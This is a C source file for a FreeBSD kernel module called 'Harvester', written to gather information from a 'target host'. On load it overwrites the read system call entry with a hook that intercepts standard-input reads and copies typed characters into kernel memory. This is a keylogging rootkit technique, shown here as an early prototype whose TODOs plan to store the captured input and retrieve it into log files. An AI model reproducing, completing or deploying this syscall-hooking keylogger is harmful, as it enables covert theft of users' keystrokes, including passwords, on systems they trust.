/*
 * Name:
 *      Harvester
 * Description:
 *      A system call module that gather information about the target host
 * Usage:
 *      TODO: Add usage here
 * Author:
 *      Hai Lang
 * Date Created:
 *      2013-02-28
 * Last Update:
 *      2013-02-28
 *
 * TODO:
 *      1. Make character device to store info
 *      2. Make client app to retrieve info and save to log files
*/

/* General Headers */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>

/* System Call Headers */
#include <sys/syscall.h>
#include <sys/stat.h>


/* Options */
#define KERNDEBUG 1

/* Harvester Implementation Function */
static int harvester(struct thread *td, void *syscall_args)
{
    uprintf("Harvester Module Loaded!\n");
    return (0);
}

/* read hook - get user input */
static int read_hook(struct thread *td, void *syscall_args)
{
    struct read_args /*{
        int fd; //object reference descriptor
        void *buf; //results will be saved here
        size_t nbyte; //size to read
    }*/ *args;
    args = (struct read_args *)syscall_args;

    int error;
    char buf[1]; //read 1 character at a time
    size_t copied;

    error = sys_read(td, syscall_args);
    if (error || (!args->nbyte) /*|| (args->nbyte > 1)*/ || (args->fd != 0)) {
        //if error reading,
        //or no byte were read
        //or more than one character were read
        //or the input is not from stardard input (d = 0)
        return (error);
    }

    /* Otherwise, copy the buf to the kernel space */
    copyinstr(args->buf, buf, 1, &copied);
    //printf("%c\n", buf[0]);

    return (error);
}

/*
 * ================System Call Config===================
 * =====================================================
*/
/* Prepare sysent to register the new system call */
static struct sysent harvester_sysent = {
    1, /* Number of arguments */
    harvester /* Implementation Function */
};

/* Define the offset in sysent[] table */
static int offset = NO_SYSCALL;

/* Event Handler Function For The New System Call */
static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch(cmd) {
        case MOD_LOAD:
            #if KERNDEBUG == 1
            uprintf("Harvester Module Loaded!\n");
            #endif
            sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
            break;
        case MOD_UNLOAD:
            #if KERNDEBUG == 1
            uprintf("Harvester Module Unloaded\n");
            #endif
            sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return (error);
}

/* Declare and register the system call module */
SYSCALL_MODULE(harvester, &offset, &harvester_sysent, load, NULL);
